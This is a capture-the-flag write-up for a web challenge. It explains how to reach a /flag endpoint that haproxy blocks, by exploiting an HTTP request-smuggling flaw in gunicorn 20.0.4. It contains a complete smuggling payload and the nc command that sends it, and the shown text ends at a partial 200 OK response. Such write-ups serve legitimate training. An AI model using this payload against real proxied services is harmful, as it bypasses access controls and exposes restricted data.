# ## Release the (g)Unicorn

## Description
```
I was surfing the Internet and came across a unicorn and a cat guarding a door. Can you help me open it?
```

## Solve

The challenge source code was provided, including the Dockerfile. We could look at the source code first and try to access the application and see how it works. The page served when accessing the URL:

![Alt text](https://github.com/uac-ctf/UA-CSW-CTF2022-Writeups/blob/master/web/release_unicorn/images/home_page.png?raw=true)

Looking into the code, we can see that there more endpoints:

```python
@app.route('/admin', methods=['GET', 'POST'])
def admin():
    return 'Under Construction...'


@app.route('/flag')
def flag():
    with open('flag', 'r') as f:
        return f.read()
```

If we try to access the */flag* endpoint, we get a **403 Forbidden**. The challenge objective was to find a way to bypass the restriction mechanism imposed in haproxy.
The challenge title was a big clue to solve this challenge, and if we look into the *requirements.txt* file, the gunicorn version is defined to *20.0.4*.

```python
Flask
flask_limiter
gunicorn==20.0.4
gunicorn[gevent]
```

A quick Google search for vulnerabilities in this version, we will come across this blog post, <https://grenfeldt.dev/2021/04/01/gunicorn-20.0.4-request-smuggling/>. From here, we just need to adapt the payload to the challenge. A possible solution would be:

```bash
GET /admin HTTP/1.1
Host: cybersecweek.ua.pt:2005
Content-Length: 78
Sec-Websocket-Key1: x

xxxxxxxxGET /flag HTTP/1.1
Host: cybersecweek.ua.pt:2005
Content-Length: 48

GET / HTTP/1.1
Host: cybersecweek.ua.pt:2005

```

Then we need to send this request to the challenge:

```bash
cat smuggle.txt | nc cybersecweek.ua.pt 2005
# Results in
HTTP/1.1 200 OK

server: gunicorn/20.0.4
